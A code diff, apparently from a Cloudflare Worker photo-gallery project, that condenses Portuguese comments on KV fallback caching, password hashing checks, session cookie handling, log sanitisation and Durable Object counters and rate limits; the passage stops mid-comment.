@@ -1,27 +1,17 @@
 import { dataSecurityHeaders, sanitizeFilename } from './security.js';
 
 /**
- * Um projeto como ele vive no KV.
- *
- * O índice é aberto de propósito. A forma real é validada na LEITURA
- * (`parseEvents`), que descarta o que não for objeto e deixa passar o resto —
- * porque o valor pode vir de um restore de backup ou de uma entrada editada à
- * mão, e a alternativa a validar na porta seria 500 na galeria inteira. Declarar
- * aqui uma forma exata que o dado não é obrigado a ter só moveria a mentira de
- * lugar.
- *
+ * Um projeto como ele vive no KV. Índice aberto de propósito: a forma real é
+ * validada na LEITURA (`parseEvents`), não aqui — o valor pode vir de um
+ * restore de backup ou edição manual, e validar na porta seria 500 na galeria
+ * inteira.
  * @typedef {Record<string, any>} Evento
  */
 /**
- * Os bindings do Worker, como declarados no wrangler.toml, mais os segredos
- * postos por `wrangler secret put`. Vale como documentação executável do
- * contrato de deploy: um binding que sumir daqui e do toml para de existir para
- * quem lê o código, e um que exista só aqui é erro de configuração à espera.
- *
- * Os segredos são opcionais porque a ausência deles é um estado REAL e tratado
- * — `auditSite()` acusa cada falta, e o site continua entregando foto. Ver o
- * comentário do SIGNING_SECRET no wrangler.toml.
- *
+ * Bindings do wrangler.toml mais os segredos de `wrangler secret put`.
+ * Segredos são opcionais porque a ausência é um estado real e tratado —
+ * `auditSite()` acusa cada falta e o site continua entregando foto (ver
+ * SIGNING_SECRET no wrangler.toml).
  * @typedef {{
  *   FOTOS: KVNamespace,
  *   COUNTER: DurableObjectNamespace<import('./counters.js').Counter>,
@@ -39,9 +29,8 @@ import { dataSecurityHeaders, sanitizeFilename } from './security.js';
  */
 
 /**
- * Um pedido de remoção / mensagem de suporte como chega aos e-mails.
- * Índice aberto pelo mesmo motivo de `Evento`: o registro é lido do KV e pode
- * vir de um restore.
+ * Um pedido de remoção / mensagem de suporte, como lido do KV. Índice aberto
+ * pelo mesmo motivo de `Evento`: pode vir de um restore.
  * @typedef {Record<string, any>} Pedido
  */
 
@@ -81,37 +70,29 @@ export const ACCESS_DECLARATIONS = {
   private: 'Declaro que sou participante deste evento ou possuo autorização para acessar estas imagens. Estou ciente de que o material destina-se ao meu uso pessoal e não deve ser comercializado.',
 };
 
-// Cópia de sobrevivência da lista de eventos, na Cache API.
+// Cópia de sobrevivência da lista de eventos, via Cache API. KV é a única
+// dependência no caminho crítico (sem lista de eventos não há slug, evento ou
+// link do Drive) — uma queda de LEITURA do KV derrubava galeria, página do
+// projeto e portão do Drive de uma vez, com 500.
 //
-// A promessa do site é entregar foto. Tudo o mais — contador, rate limit,
-// painel — é acessório, e o KV é a única dependência no caminho crítico: sem a
-// lista de eventos não há slug, não há evento e não há link do Drive. Uma
-// indisponibilidade de LEITURA do KV derrubava a galeria, a página do projeto e
-// o portão do Drive de uma vez, com 500.
-//
-// A Cache API é a saída certa aqui: é gratuita, não tem cota de escrita, vive
-// no colo (não no isolate) e por isso sobrevive à troca de isolate, que é
-// justamente o buraco que o cache de módulo não cobre. Não é banco de dados —
-// pode ser despejada a qualquer momento e é por colo, não global — mas como
-// último recurso antes do 500 ela é exatamente do tamanho do problema.
-//
-// URL sintética: a Cache API exige uma chave http(s), e este host não existe.
-const EVENTS_CACHE_KEY = 'https://fotos.invalid/__events';
-// Sete dias. Não é "por quanto tempo o dado vale", é "por quanto tempo ainda
-// prefiro dado velho a um 500" — e a resposta é: mais do que qualquer queda de
-// KV plausível.
+// Cache API: grátis, sem cota de escrita, vive no colo (não no isolate) e por
+// isso sobrevive à troca de isolate — o buraco que o cache de módulo não
+// cobre. Não é fonte de verdade, pode ser despejada a qualquer momento, mas
+// como último recurso antes do 500 é do tamanho certo do problema.
+const EVENTS_CACHE_KEY = 'https://fotos.invalid/__events'; // Cache API exige chave http(s)
+// 7 dias: não é "por quanto tempo o dado vale", é "por quanto tempo ainda
+// prefiro dado velho a um 500" — mais que qualquer queda de KV plausível.
 const EVENTS_CACHE_TTL_S = 7 * 24 * 3600;
 /** @type {string|null} */
 let _mirroredRaw = null;
 
 function cacheStore() {
-  // Ausente no vitest e em qualquer runtime que não seja o Workers. Sem ela as
-  // outras camadas continuam valendo — a função inteira é best-effort.
+  // Ausente no vitest e fora do runtime Workers — função inteira é best-effort.
   return (typeof caches !== 'undefined' && caches && caches.default) || null;
 }
 
-// Só grava quando o valor MUDOU: a cópia é um espelho, não um log, e reescrever
-// a cada leitura gastaria CPU do isolate à toa no caminho de resposta.
+// Só grava quando o valor MUDOU: reescrever a cada leitura gastaria CPU do
+// isolate à toa no caminho de resposta.
 /**
  * @param {string} raw
  */
@@ -140,15 +121,10 @@ async function readMirroredEvents() {
   }
 }
 
-// A queda para a cópia de sobrevivência entra no mesmo registro de degradações
-// (`noteDegraded`) que todo o resto. Já foi um contador comparado antes/depois
-// pelo healthz, para dizer se ESTA leitura degradou; não funcionava, porque o
-// estado é do módulo e a queda de uma requisição CONCORRENTE fazia o healthz
-// declarar `kv:false` e 503 — reprovando o smoke test do deploy — tendo lido do
-// KV sem problema nenhum. Hoje o healthz decide `kv` pela PRÓPRIA leitura (que
-// usa `fresh` e por isso nunca cai para a cópia), e isto aqui é o aviso de que
-// o visitante andou sendo servido de cópia: exatamente o que estado de módulo
-// consegue afirmar com honestidade.
+// Entra no registro de degradações central. healthz decide `kv` pela própria
+// leitura (fresh, nunca cai para cópia) e não por este estado de módulo —
+// compartilhado entre requisições concorrentes, o que já causou um
+// falso-negativo ali (healthz via `kv:false` por uma queda de outra requisição).
 /**
  * @param {string} source
  */
@@ -159,9 +135,8 @@ function noteEventsFallback(source) {
   );
 }
 
-// Mesma validação de forma para o valor vindo do KV e para o vindo da cópia:
-// duas versões disso divergiriam, e a cópia é justamente o caminho que ninguém
-// exercita no dia a dia.
+// Mesma validação de forma para o valor do KV e o da cópia — duas versões
+// disso divergiriam, e a cópia é o caminho que ninguém exercita no dia a dia.
 /**
  * @param {string|null|undefined} data
  * @returns {Evento[]}
@@ -191,28 +166,22 @@ export async function getEvents(env, fresh = false) {
   try {
     data = await env.FOTOS.get('events');
   } catch (e) {
-    // `fresh` NUNCA cai para a cópia. Quem pede fresh é leitura de admin ou
-    // read-modify-write (criar, editar, esconder, apagar projeto, restaurar
-    // backup): ali servir dado velho não é degradar com elegância, é preparar
-    // uma PERDA DE DADOS — o `saveEvents` seguinte gravaria a lista antiga por
-    // cima, apagando tudo o que mudou desde que a cópia foi feita. Falhar aqui
-    // custa uma mensagem de erro ao dono; a alternativa custa os projetos.
+    // `fresh` NUNCA cai para a cópia: quem pede fresh é admin ou
+    // read-modify-write, onde dado velho não degrada com elegância — o
+    // `saveEvents` seguinte gravaria a lista antiga por cima, apagando tudo
+    // que mudou desde a cópia. Falhar aqui custa um erro ao dono; a
+    // alternativa custa os projetos.
     if (fresh) throw e;
 
-    // Daqui para baixo é só caminho de VISITANTE, onde a lista velha ainda
-    // entrega a foto certa. A ordem é do dado mais novo para o mais velho.
-    //
-    // 1) O cache do próprio isolate, mesmo VENCIDO. Antes ele era descartado
-    //    aqui: passados os 30 s de TTL, um isolate que tinha a lista na mão
-    //    respondia 500 assim que o KV falhava. Velho por 30 s continua sendo a
-    //    lista certa.
+    // Caminho de VISITANTE, onde lista velha ainda entrega a foto certa.
+    // Do mais novo ao mais velho:
     if (_cache) {
+      // Cache do isolate, mesmo vencido — velho por 30s continua certo.
       noteEventsFallback('cache do isolate');
       console.error('KV read failed; serving events from the isolate cache', e);
       return _cache;
     }
-    // 2) A cópia na Cache API — o que salva um isolate FRIO, que é o caso comum
-    //    numa queda: tráfego novo cai em isolate novo, sem cache de módulo.
+    // Cópia na Cache API: salva um isolate FRIO, o caso comum numa queda.
     const mirrored = await readMirroredEvents();
     if (mirrored !== null) {
       noteEventsFallback('cópia na Cache API');
@@ -221,23 +190,18 @@ export async function getEvents(env, fresh = false) {
       _cacheAt = now;
       return _cache;
     }
-    // 3) Sem cópia nenhuma não há o que servir. Propaga: devolver [] aqui
-    //    transformaria uma queda de KV em "o site existe e não tem projeto
-    //    nenhum" — 404 em tudo, `ok:true` no healthz e nada vermelho no painel.
-    //    Mentir sobre não ter dado é pior do que assumir a falha.
+    // Sem cópia, propaga: devolver [] viraria "site sem projeto nenhum" — 404
+    // em tudo, `ok:true` no healthz. Mentir sobre não ter dado é pior.
     throw e;
   }
 
-  // Single choke point for shape validation: every caller (gallery, event page,
-  // dashboard, metrics, healthz, backup) reads through here, so one guard keeps
-  // a corrupted `events` value — a bad restore, a hand-edited KV entry, a
-  // truncated write — from throwing on `e.visible` / `e.slug` and 500-ing the
-  // whole public site. Non-array payloads and non-object entries are dropped
-  // instead of propagating; the next save then self-heals the stored value.
+  // Single choke point for shape validation: every caller reads through here,
+  // so a corrupted `events` value (bad restore, truncated write) can't throw
+  // on `e.visible`/`e.slug` and 500 the whole public site.
   _cache = parseEvents(data);
   _cacheAt = now;
-  // Espelha o texto cru, não o objeto já filtrado: a cópia tem de ser o que o
-  // KV guardava, para a validação de forma acontecer na leitura dela também.
+  // Espelha o texto cru, não o objeto filtrado: a validação de forma precisa
+  // acontecer de novo na leitura da cópia também.
   if (typeof data === 'string') await mirrorEvents(data);
   return _cache;
 }
@@ -263,16 +227,10 @@ export const DEFAULT_CATEGORIES = ['Formatura', 'Casamento', 'Ensaio', 'Evento',
 export const MAX_CATEGORIES = 30;
 export const MAX_CATEGORY_LEN = 40;
 
-// Uma falha de LEITURA aqui propaga, de propósito. Já caiu nos padrões, e era
-// perda de dados esperando acontecer: todos os chamadores são rotas de admin
-// (painel, criar/editar projeto, criar/apagar categoria, backup/restore) — a
-// galeria pública deriva os filtros dos próprios eventos e nunca passa por
-// aqui. Então o "fallback" não mantinha página nenhuma de pé; só entregava a
-// lista errada para caminhos que a GRAVAM de volta (`handleCreateCategory`,
-// `handleRestoreBackup`), apagando para sempre as categorias do dono.
-//
-// Um valor corrompido continua caindo nos padrões: ali não há o que preservar,
-// e a próxima gravação conserta o valor guardado.
+// Falha de LEITURA propaga, de propósito: todo chamador é rota de admin que
+// pode GRAVAR a lista de volta (criar categoria, restore) — cair para os
+// defaults apagaria para sempre as categorias do dono. Valor corrompido, sim,
+// cai para os defaults: nada ali para preservar, e a próxima gravação conserta.
 /**
  * @param {Env} env
  */
@@ -359,18 +317,12 @@ export async function verifyPassword(password, stored) {
   }
   const [, rawIterations, saltHex] = stored.split(':');
   const iterations = parseInt(rawIterations, 10);
-  // Um hash guardado ilegível não pode virar EXCEÇÃO. `deriveBits` recusa uma
-  // contagem de iterações que não seja inteiro positivo, então um valor
-  // corrompido em `admin_password` (`pbkdf2:abc:...`, um restore torto, uma
-  // escrita truncada) lançava de dentro do login — 500 na tela, em vez do
-  // "senha incorreta" que o fluxo sabe tratar. O 500 é pior de duas maneiras:
-  // esconde a causa real do dono e desvia do redirect que conta a tentativa.
-  //
-  // O teto existe pelo outro lado: a contagem vem do próprio registro, e um
-  // número absurdo (`pbkdf2:99999999999:...`) é uma forma barata de estourar o
-  // orçamento de CPU do Worker a cada tentativa de login — negação de serviço
-  // sobre o único caminho de entrada do painel. Fora da faixa, a credencial é
-  // tratada como ilegível: recusa e ninguém entra com ela.
+  // Hash ilegível não pode virar EXCEÇÃO: `deriveBits` recusa uma contagem de
+  // iterações não inteira/positiva, e um `admin_password` corrompido lançaria
+  // de dentro do login — 500 em vez de "senha incorreta", escondendo a causa e
+  // pulando o redirect que conta a tentativa. Teto do outro lado: a contagem
+  // vem do próprio registro, e um valor absurdo estouraria CPU do Worker a
+  // cada tentativa — DoS sobre a única porta de entrada do painel.
   if (!Number.isInteger(iterations) || iterations < 1 || iterations > 1_000_000) return false;
   if (typeof saltHex !== 'string' || !/^[0-9a-f]+$/.test(saltHex) || saltHex.length % 2 !== 0) return false;
   const candidate = await hashPassword(password, saltHex, iterations);
@@ -386,15 +338,13 @@ export function generateToken() {
 // ---------------------------------------------------------------------------
 // Sessão do painel
 // ---------------------------------------------------------------------------
-// O cookie usa o prefixo `__Host-`, que não é cosmético: o browser só aceita
-// gravá-lo com Secure, Path=/ e SEM atributo Domain. Na prática isso significa
-// que nenhum outro host de lucafchala.com — nem um subdomínio comprometido, nem
-// um serviço de terceiro apontado por CNAME — consegue definir ou sobrescrever
-// o cookie de sessão deste site. É a única forma de fixação de sessão por
-// vizinho de domínio que o SameSite=Strict sozinho não cobria.
+// Prefixo `__Host-`: o browser só aceita gravá-lo com Secure, Path=/ e SEM
+// Domain — nenhum outro host de lucafchala.com (subdomínio comprometido,
+// CNAME de terceiro) consegue definir ou sobrescrever este cookie. Cobre a
+// fixação de sessão por vizinho de domínio que SameSite=Strict sozinho não pega.
 //
-// O nome antigo (`session`) continua sendo LIDO para que o deploy não derrube a
-// sessão de quem já estava logado. Só gravamos o novo.
+// Nome antigo (`session`) continua sendo LIDO para não derrubar quem já
+// estava logado antes do deploy. Só gravamos o novo.
 export const SESSION_COOKIE = '__Host-session';
 export const SESSION_TTL_SECS = 86400;     // teto absoluto: 24 h, como antes
 export const SESSION_IDLE_SECS = 7200;     // 2 h sem uso encerram a sessão
@@ -409,10 +359,9 @@ export function sessionCookie(token, { clear = false } = {}) {
   return clear ? `${base}; Max-Age=0` : `${base}; Max-Age=${SESSION_TTL_SECS}`;
 }
 
-// Impressão grosseira do cliente. Só o User-Agent: IP fica de fora de propósito
-// porque celular troca de IP o tempo todo (4G <-> Wi-Fi) e amarrar a sessão a
-// ele significaria deslogar o admin no meio de uma edição. O UA muda só quando
-// o browser atualiza, e o custo desse caso é um login a mais.
+// Impressão grosseira do cliente. Só User-Agent: IP fica de fora porque
+// celular troca de IP o tempo todo (4G/Wi-Fi) e amarrar a sessão a ele
+// deslogaria o admin no meio de uma edição.
 /**
  * @param {Request} request
  */
@@ -434,9 +383,9 @@ export function sessionRecord(request) {
   return JSON.stringify({ v: 1, createdAt: now, lastSeen: now, fp: clientFingerprint(request) });
 }
 
-// Encerra a sessão por qualquer um dos três motivos e some com a chave. Antes
-// isto era uma comparação com a string 'valid': uma sessão só morria pelo TTL
-// de 24 h do KV, sem inatividade e sem vínculo com o cliente que a abriu.
+// Encerra a sessão por TTL, inatividade OU fingerprint trocado — antes era só
+// uma comparação com a string 'valid', sem inatividade nem vínculo com o
+// cliente que abriu a sessão.
 /**
  * @param {Env} env
  * @param {Request} request
@@ -444,23 +393,14 @@ export function sessionRecord(request) {
 export async function verifySession(env, request) {
   const cookies = request.headers.get('Cookie') || '';
 
-  // `__Host-session` PRIMEIRO; o cookie legado só como fallback.
-  //
-  // Isto era um padrão único com `(?:__Host-)?`, e `match()` devolve a PRIMEIRA
-  // ocorrência — então `session=antigo; __Host-session=novo` resolvia para o
-  // ANTIGO. Duas consequências, ambas ruins:
-  //
-  //  1. Quem tinha sessão aberta antes da migração para `__Host-` ficava em
-  //     loop de login: o login gravava o cookie novo, o legado continuava
-  //     sombreando, e a sessão nunca era encontrada no KV.
-  //  2. Pior, era forçável de fora. Um host vizinho de `lucafchala.com`
-  //     consegue gravar `session=` de domínio, mas **não** `__Host-session`
-  //     (é justamente essa a garantia do prefixo). Bastava ele escrever 64
-  //     hexadecimais quaisquer para derrubar o painel — exatamente o ataque
-  //     que o prefixo `__Host-` foi adotado para impedir.
-  //
-  // Ordem explícita resolve as duas: o cookie que só a nossa origem consegue
-  // gravar tem precedência sobre o que qualquer vizinho grava.
+  // `__Host-session` PRIMEIRO, cookie legado só como fallback. Um padrão único
+  // com `(?:__Host-)?` pega a PRIMEIRA ocorrência de `match()` — em
+  // `session=antigo; __Host-session=novo` isso resolvia para o ANTIGO. Além de
+  // travar em loop quem migrou, era forçável: um host vizinho de
+  // lucafchala.com pode gravar `session=` mas não `__Host-session` (é a
+  // garantia do prefixo) — bastava escrever 64 hexadecimais para derrubar o
+  // painel, o ataque que `__Host-` existe para impedir. Ordem explícita
+  // resolve os dois: o cookie que só nossa origem grava tem precedência.
   const match = cookies.match(/(?:^|;\s*)__Host-session=([a-f0-9]{64})/)
              || cookies.match(/(?:^|;\s*)session=([a-f0-9]{64})/);
   if (!match) return false;
@@ -479,9 +419,8 @@ export async function verifySession(env, request) {
   if (!rec || typeof rec !== 'object') return false;
 
   const now = Date.now();
-  // `createdAt` ausente ou corrompido não pode virar "sessão eterna": sem um
-  // início confiável, não dá para dizer se o teto de 24 h já passou, e a
-  // resposta segura para uma credencial ilegível é recusá-la.
+  // createdAt ausente/corrompido não pode virar "sessão eterna": sem início
+  // confiável, a resposta segura para uma credencial ilegível é recusá-la.
   const createdAt = typeof rec.createdAt === 'number' && Number.isFinite(rec.createdAt) ? rec.createdAt : null;
   if (createdAt === null) {
     await env.FOTOS.delete(key).catch(() => {});
@@ -491,11 +430,9 @@ export async function verifySession(env, request) {
     await env.FOTOS.delete(key).catch(() => {});
     return false;
   }
-  // Teto absoluto verificado no código, e não só pelo TTL do KV. O TTL é a
-  // primeira linha, mas ele é um efeito colateral do armazenamento: se um
-  // registro for reescrito com o prazo errado (foi o que um `createdAt`
-  // corrompido causava, gerando um expirationTtl NaN que a escrita recusava em
-  // silêncio), a sessão sobrevivia além das 24 h sem ninguém notar.
+  // Teto absoluto checado no código, não só pelo TTL do KV: um registro
+  // reescrito com prazo errado (createdAt corrompido gerava expirationTtl NaN,
+  // que a escrita recusa em silêncio) sobreviveria além das 24h sem aviso.
   if (now - createdAt > SESSION_TTL_SECS * 1000) {
     await env.FOTOS.delete(key).catch(() => {});
     return false;
@@ -505,12 +442,10 @@ export async function verifySession(env, request) {
     return false;
   }
 
-  // Renovação com trava: uma escrita a cada 10 min por sessão, não uma por
-  // requisição. O painel faz várias chamadas por tela e a cota de escrita do KV
-  // é de 1000/dia — sem a trava, uma tarde de uso consumiria a cota do site.
+  // Renovação travada a 1x/10min por sessão, não por requisição: o painel faz
+  // várias chamadas por tela e a cota de escrita do KV é 1000/dia.
   if (typeof rec.lastSeen !== 'number' || now - rec.lastSeen > SESSION_REFRESH_SECS * 1000) {
-    // O TTL renovado acompanha o teto absoluto: renovar por mais 24 h a cada
-    // uso transformaria a sessão de 24 h numa sessão perpétua.
+    // TTL renovado acompanha o teto absoluto — senão viraria sessão perpétua.
     const ttl = Math.max(60, Math.round((createdAt + SESSION_TTL_SECS * 1000 - now) / 1000));
     await env.FOTOS.put(key, JSON.stringify({ ...rec, lastSeen: now }), { expirationTtl: ttl })
       .catch(e => noteKvFailure('escrita', e, 'session refresh'));
@@ -518,78 +453,48 @@ export async function verifySession(env, request) {
   return true;
 }
 
-// A cota de escrita do KV é de 1000/dia no plano free, para a conta inteira, e
-// quando ela estoura o KV passa a RECUSAR escrita — leitura continua normal, e
-// a recusa chega como EXCEÇÃO, não como valor de retorno. Um dia de tráfego
-// grande (lançamento de projeto, link no Instagram) chega lá: cada visitante
-// gasta escrita no contador de visitas e no rate limit do portão do Drive.
-//
-// Sem tratamento, essa exceção sobe de `checkRateLimit` até o catch do
-// `fetch()` e vira **500 para todo mundo no portão do Drive** — as fotos param
-// de sair exatamente no dia de maior público — e trava o login do painel, ou
-// seja, o dono perde o acesso justo quando precisa investigar.
-//
-// Por isso a escrita do contador é isolada e o limite deixa passar quando ela
-// falha. É uma decisão consciente na mesma direção do resto do projeto: o rate
-// limit é mitigação de abuso, não garantia (ver SECURITY.md), e recusar as
-// fotos de todo mundo para não deixar passar uma requisição extra é o pior dos
-// dois lados. O contrapeso é não ser silencioso: a falha fica registrada e o
-// `/api/healthz` grita — mesmo padrão do SIGNING_SECRET.
+// KV write quota is 1000/day account-wide; past it, writes throw. Unhandled,
+// that would bubble from `checkRateLimit` into fetch()'s catch — 500 on the
+// Drive gate for everyone right at peak traffic. So counter/rate-limit writes
+// are isolated and fail open, logged via noteDegraded/healthz instead
+// (mitigation, not a guarantee — SECURITY.md).
 // ---------------------------------------------------------------------------
 // Registro de degradações: um lugar só, para nada falhar calado
 // ---------------------------------------------------------------------------
-// A promessa operacional do projeto é que nada se degrade em silêncio. O site
-// foi desenhado para continuar entregando foto quando as coisas quebram — cota
-// de escrita estourada, KV de leitura fora, contador recusado — e é justamente
-// isso que torna o aviso obrigatório: sem ele, "o site está no ar" vira prova de
-// que está tudo bem, quando pode ser o oposto.
+// O site continua entregando foto quando algo quebra — por isso o aviso é
+// obrigatório: sem ele, "o site está no ar" vira prova de que está tudo bem.
+// Era três registradores separados; agora é um: quem degradar chama
+// `noteDegraded`, e /api/healthz relata tudo dentro da janela.
 //
-// Isto começou como dois registradores separados (um para KV, um para a queda
-// para a cópia de eventos) e ia virar três. Três lugares para lembrar de avisar
-// é como se esquece de avisar. Agora é um: quem degradar chama `noteDegraded`, e
-// o /api/healthz relata tudo o que estiver dentro da janela — sem precisar que
-// alguém se lembre de acrescentar a linha nova ao painel.
-//
-// Estado de módulo, de propósito e sem custo: persistir exigiria justamente a
-// escrita que pode estar sendo recusada. Vale para o isolate que registrou —
-// aceitável porque essas condições são da conta inteira e duram, então qualquer
-// isolate servindo tráfego encontra a mesma falha em segundos.
+// Estado de módulo, sem persistência (persistir exigiria a escrita que pode
+// estar sendo recusada) — vale por isolate, aceitável porque a condição é da
+// conta inteira e qualquer isolate a encontra em segundos.
 const DEGRADED_TTL_MS = 30 * 60_000;
 const _degraded = new Map();
 
-// `label` é a chave de deduplicação (a mesma degradação repetida não vira várias
-// linhas) e também o texto que aparece no painel. Escreva-o como a frase que
-// você gostaria de ler às 2h da manhã: o que quebrou, e o que deixou de
-// funcionar por causa disso.
-// Tudo o que entra aqui atravessa `umaLinha()` antes de virar log ou texto de
-// painel. O `detail` carrega mensagem de erro de sistema externo (KV, D1,
-// Resend) e identificador de evento — dados que não vêm de nós. Uma quebra de
-// linha no meio disso forja uma entrada de log inteira, e é assim que se apaga
-// o rastro de um incidente escrevendo dentro do próprio relato dele. O slug já
-// é validado antes de chegar aqui, mas um saneamento que depende de todo
-// chamador ter validado é um saneamento que cede no primeiro chamador novo.
+// `label` é a chave de dedup e o texto exibido no painel — escreva como a
+// frase que você quer ler às 2h da manhã: o que quebrou, o que parou.
+// Tudo passa por `umaLinha()` antes de virar log/texto de painel: `detail`
+// carrega erro de sistema externo e identificadores que não são nossos, e uma
+// quebra de linha ali forjaria uma entrada de log inteira.
 /**
  * @param {unknown} v
  */
 function umaLinha(v) {
   return String(v)
-    // Controles C0/C1 e separadores de linha Unicode, escritos por codigo-ponto
-    // e nao por caractere colado: um intervalo literal aqui fica ilegivel no
-    // editor seguinte, e foi assim que a primeira versao disto saiu errada.
+    // Controles C0/C1 e separadores de linha Unicode por código-ponto, não por
+    // caractere colado — um intervalo literal aqui fica ilegível no editor.
     // eslint-disable-next-line no-control-regex
     .replace(/[\u0000-\u001f\u007f-\u009f\u2028\u2029]+/g, ' ')
     .trim()
     .slice(0, 160);
 }
 
-// Mensagem legível a partir de algo LANÇADO — que não é necessariamente um
-// Error. `catch (e)` entrega `unknown`: pode vir uma string, um objeto de uma
-// biblioteca, ou `undefined` de um `throw` sem valor. Ler `.message` direto
-// funcionava por acidente e quebrava o próprio tratador no caso raro, que é
-// justamente o caso em que se está tentando registrar o que deu errado.
-//
-// O padrão antigo (`e && e.message ? e.message : e`) também mentia: um objeto
-// sem `message` virava a string "[object Object]" no painel.
+// Mensagem legível a partir de algo LANÇADO, não necessariamente um Error.
+// `catch (e)` entrega `unknown` — string, objeto de lib, ou `undefined` de um
+// `throw` sem valor. Ler `.message` direto quebrava justo no caso raro que se
+// está tentando registrar. O padrão antigo (`e && e.message ? e.message : e`)
+// também mentia: objeto sem `message` virava "[object Object]" no painel.
 /**
  * @param {unknown} err
  * @returns {string}
@@ -630,10 +535,9 @@ export function degradedHealth(now = Date.now()) {
 
 export function resetDegraded() { _degraded.clear(); }
 
-// Atalho para o caso mais comum: uma operação de KV recusada. `op` é 'escrita'
-// ou 'leitura', e a distinção não é cosmética — a mensagem ACUSA UMA CAUSA, e
-// uma falha de leitura relatada como escrita mandava quem fosse investigar
-// procurar cota de escrita esgotada, que não tem nada a ver.
+// Atalho para o caso mais comum: uma operação de KV recusada. `op` não é
+// cosmético — uma falha de leitura relatada como escrita mandaria quem
+// investiga procurar cota de escrita esgotada, sem nada a ver.
 /**
  * @param {'escrita'|'leitura'} op
  * @param {unknown} err
@@ -651,27 +555,21 @@ export function noteKvFailure(op, err, context = '') {
 // ---------------------------------------------------------------------------
 // Contadores: um Durable Object por chave, incremento atômico
 // ---------------------------------------------------------------------------
-// Aqui morava a agregação em memória — mapa de pendentes, piso de 1 s por
-// chave, trava de flush, drenagem agendada — que existia porque o KV não tem
-// incremento atômico e recusa mais de uma escrita por segundo na mesma chave.
-// O Durable Object dá as duas coisas de graça, então a máquina inteira saiu.
-// O porquê da troca está em src/counters.js.
-//
-// O que se ganhou, além da simplicidade: a contagem deixou de ser
-// "best-effort, non-atomic" e passou a ser exata mesmo sob rajada, e nada mais
-// se perde quando o isolate morre com incremento pendente — não há pendente.
+// Substituiu a agregação em memória (mapa de pendentes, piso de 1s, trava de
+// flush) que existia porque KV não tem incremento atômico e recusa >1
+// escrita/s por chave. DO resolve as duas de graça — porquê da troca em
+// src/counters.js. Contagem exata mesmo sob rajada, e nada se perde se o
+// isolate morrer com incremento pendente — não há pendente.
 
-// Nome fixo: todos os contadores moram no MESMO objeto. Ver o comentário em
-// src/counters.js para por que não é um objeto por chave (resposta curta: o
-// painel lê tudo de uma vez, e chamada de DO é subrequisição — 50 por
-// invocação no plano gratuito).
+// Nome fixo: todos os contadores no MESMO objeto — painel lê tudo de uma vez,
+// e chamada de DO é subrequisição (50/invocação no plano gratuito). Ver
+// src/counters.js.
 const COUNTER_OBJ = 'contadores';
 
 /**
- * A superfície RPC que este módulo usa do Counter. Declarada à mão porque a
- * inferência sobre `DurableObjectNamespace<Counter>` estoura a profundidade do
- * tsc ("Type instantiation is excessively deep") — e um `any` aqui esconderia
- * justamente os nomes que quebrariam num rename.
+ * Superfície RPC usada do Counter, declarada à mão: a inferência sobre
+ * `DurableObjectNamespace<Counter>` estoura a profundidade do tsc. Um `any`
+ * aqui esconderia justamente os nomes que quebrariam num rename.
  * @typedef {{
  *   increment: (key: string, by?: number) => Promise<number>,
  *   value: (key: string) => Promise<number>,
@@ -689,9 +587,9 @@ function counterStub(env) {
   return /** @type {any} */ (env.COUNTER.get(env.COUNTER.idFromName(COUNTER_OBJ)));
 }
 
-// Nunca lança: é chamada do caminho de resposta do visitante, onde uma exceção
+// Nunca lança: chamada do caminho de resposta do visitante, onde uma exceção
 // viraria 500 numa página que só queria contar uma visita. Devolve a promessa
-// da gravação, para quem não tem `ctx` conseguir aguardá-la.
+// para quem não tem `ctx` conseguir aguardá-la.
 /**
  * @param {Env} env
  * @param {{ waitUntil?: (p: Promise<any>) => void }|null} ctx
@@ -723,14 +621,10 @@ export async function readCounter(env, key) {
   }
 }
 
-// Leitura em LOTE, para o painel. Uma subrequisição para todos os projetos,
-// em vez de duas por projeto — é o que conserta o "Erro ao carregar métricas"
-// que aparecia a partir de ~24 projetos.
-//
-// O assentamento do histórico acontece aqui, e não dentro do objeto: ler o KV
-// lá dentro gastaria a cota de subrequisição DELE, que é o mesmo erro um nível
-// abaixo. Aqui as leituras de KV são do Worker, servidas do cache de borda, e
-// só acontecem uma vez — depois do primeiro `seed()` nada mais falta.
+// Leitura em LOTE para o painel: uma subrequisição para todos os projetos, não
+// duas por projeto — resolve o "Erro ao carregar métricas" a partir de ~24
+// projetos. O assentamento (seed) acontece aqui e não dentro do objeto: ler o
+// KV lá dentro gastaria a cota de subrequisição DELE, mesmo erro um nível abaixo.
 /**
  * @param {Env} env
  * @param {string[]} keys
@@ -770,19 +664,14 @@ export async function deleteCounters(env, keys) {
   }
 }
 
-// Contadores em KV são strings, e uma corrompida lida com parseInt puro devolve
-// NaN — `String(NaN)` grava "NaN" de volta e envenena o contador para sempre,
-// porque todo incremento seguinte relê "NaN".
+// Contador em KV é string; parseInt puro numa corrompida devolve NaN, e
+// `String(NaN)` grava "NaN" de volta — envenenando o contador para sempre.
+// Estrito de propósito: parseInt sozinho aceita prefixo ("12abc"->12) e
+// negativo ("-5"). Contador é inteiro não-negativo ou é lixo — lixo recomeça
+// do 0 em vez de carregar sujeira adiante.
 //
-// Estrito de propósito: parseInt sozinho salva um prefixo ("12abc" -> 12) e
-// aceita negativo ("-5"), então um valor meio corrompido seria adotado como se
-// fosse a contagem real. Contador é inteiro não-negativo ou é lixo — o resto
-// recomeça do 0 em vez de carregar sujeira adiante.
-//
-// Mora aqui, e não em index.js, porque o flush de contadores precisa dele e
-// utils.js não pode importar de index.js (importaria em círculo). index.js
-// reexporta, para que o contrato dos valores-veneno continue preso pelos testes
-// que já existem.
+// Mora aqui, não em index.js, porque utils.js não pode importar de index.js
+// (círculo); index.js reexporta.
 /**
  * @param {unknown} v
  * @returns {number}
@@ -796,17 +685,14 @@ export function toCount(v) {
   return Number.isSafeInteger(n) ? n : 0;
 }
 
-// Rate limit de janela fixa, em Durable Object: um objeto por par (chave, IP).
+// Rate limit de janela fixa em Durable Object, um objeto por (chave, IP).
+// Antes era leitura+escrita separadas em KV — corrida onde duas requisições
+// liam a mesma contagem e ambas passavam. Agora checagem+incremento acontecem
+// na mesma chamada, serializada pelo runtime.
 //
-// Antes eram uma leitura e uma escrita em KV por chamada, com a checagem e o
-// incremento em passos separados — duas requisições simultâneas liam a mesma
-// contagem e ambas passavam. Agora as duas coisas acontecem dentro da mesma
-// chamada serializada pelo runtime, então a corrida some junto com a escrita.
-//
-// Continua falhando ABERTO, e isso não é economia de nada: uma falha de
-// contabilidade não pode derrubar a entrega das fotos nem trancar o dono do
-// lado de fora do painel. O contrapeso é não ser silencioso — a falha entra no
-// registro de degradações e aparece no /api/healthz. Ver SECURITY.md.
+// Falha ABERTO: contabilidade não pode derrubar a entrega de fotos nem
